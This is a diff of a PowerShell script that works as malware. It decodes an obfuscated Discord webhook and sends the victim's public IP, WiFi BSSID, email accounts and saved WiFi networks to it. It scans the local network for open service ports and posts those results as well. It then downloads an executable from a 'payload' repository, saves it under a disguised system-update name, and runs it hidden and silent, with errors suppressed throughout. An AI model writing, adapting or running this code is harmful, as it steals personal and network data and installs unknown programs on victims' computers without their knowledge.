@@ -4,8 +4,6 @@ $b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDgzOTAyMjQwMTAyOD
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$ports = @(21,22,23,2323,53,81,80,135,139,443,445,3306,3389,5555,8080,8000,8083,8123)
-
 try {
     $ipP = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
     $bssid = try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'}
@@ -32,7 +30,8 @@ try {
         "Accounts" = $found_emails
         "WiFi"     = $wifi_list
     }
-    $msgPayload = @{ content = '```json' + "`n" + ($reportData | ConvertTo-Json -Depth 5) + "`n" + '```' } | ConvertTo-Json
+    $msgPayload = @{ content = '```json' + "`n" + ($reportData | ConvertTo-Json -Depth 5) + "`n" + '
+```' } | ConvertTo-Json
     Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgPayload)) -ContentType 'application/json'
 } catch {}
 
@@ -47,20 +46,7 @@ try {
 } catch {}
 
 try {
-    $url = "https://github.com/fridaynightmare/payload-geckolib/raw/refs/heads/main/scanner.exe"
-    $dest = "$env:TEMP\sys_cache_update.exe"
-
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    (New-Object Net.WebClient).DownloadFile($url, $dest)
-
-    if (Test-Path $dest) {
-        Start-Process -FilePath $dest -WindowStyle Hidden -Args "/silent" -ErrorAction SilentlyContinue
-    }
-} catch {
-}
-
-
-try {
+    $ports = @(21,22,23,2323,53,81,80,135,139,443,445,3306,3389,5555,8080,8000,8083,8123)
     $activeRoute = Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Sort-Object RouteMetric | Select-Object -First 1
     if ($activeRoute) { $localIP = (Get-NetIPAddress -InterfaceIndex $activeRoute.InterfaceIndex -AddressFamily IPv4).IPAddress | Select-Object -First 1 }
 
@@ -98,9 +84,22 @@ try {
 
         if($netResults.Count -gt 0){
             $netJson = @{ "NETWORK_SCAN" = $netResults } | ConvertTo-Json
-            $msgNet = @{ content = '```json' + "`n" + $netJson + "`n" + '```' } | ConvertTo-Json
+            $msgNet = @{ content = '```json' + "`n" + $netJson + "`n" + '
+```' } | ConvertTo-Json
             Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($msgNet)) -ContentType 'application/json'
         }
         $pool.Close()
+    }
+} catch {}
+
+try {
+    $url = "https://github.com/fridaynightmare/payload-geckolib/raw/refs/heads/main/scanner.exe"
+    $dest = "$env:TEMP\sys_cache_update.exe"
+
+    # Asegurar descarga
+    (New-Object Net.WebClient).DownloadFile($url, $dest)
+
+    if (Test-Path $dest) {
+        Start-Process -FilePath $dest -WindowStyle Hidden -Args "/silent" -ErrorAction SilentlyContinue
     }
 } catch {}
